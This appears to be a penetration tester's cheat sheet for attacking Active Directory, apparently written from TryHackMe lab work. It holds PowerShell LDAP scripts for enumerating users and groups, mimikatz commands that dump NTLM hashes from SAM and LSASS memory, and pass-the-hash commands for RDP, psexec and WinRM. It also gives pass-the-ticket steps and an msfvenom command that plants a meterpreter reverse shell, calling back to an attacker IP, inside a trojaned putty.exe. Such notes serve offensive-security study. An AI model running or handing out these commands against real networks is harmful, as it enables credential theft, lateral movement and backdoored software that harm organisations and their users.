# Active Directory

## Net commands  

Local user accounts.  

`net user`  

All domain user accounts with /domain flag.  

`net user /domain`  

Display information about a specific user.  

`net user bob_admin /domain`  

Enumerate all groups on the domain.  

`net group /domain`  

## Users  

Powershell script to collect all users.  

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="samAccountType=805306368"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    
    Write-Host "------------------------"
}

```
## Nested groups  

Using the script to enumerate groups.  

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="(objectClass=Group)"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    $obj.Properties.name
}
```  

The above script output can be enumrated for members that are groups (nested).  

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="(name=Secret_Group)"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    $obj.Properties.member
}

```  




## NTLM hash

NTLM hashes from local SAM.

    mimikatz # privilege::debug
    mimikatz # token::elevate
    mimikatz # lsadump::sam

NTLM hashes from LSASS memory.

    mimikatz # privilege::debug
    mimikatz # token::elevate
    mimikatz # sekurlsa::msv

Using extracted hashes for pass the hash.

    mimikatz # token::revert
    mimikatz # sekurlsa::pth /user:elliot.alderson /domain:za.tryhackme.com /ntlm:654e4545455e5de /run:"some command"


RDP PTH

    xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH

psexec PTH

    psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP

WinRM PTH

    evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH

Pass-the-Ticket

    mimikatz # privilege::debug
    mimikatz # sekurlsa::tickets /export

Once the desired ticket has been extracted.

`mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi`  

Backdoor .exe files.

`msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe`  

  

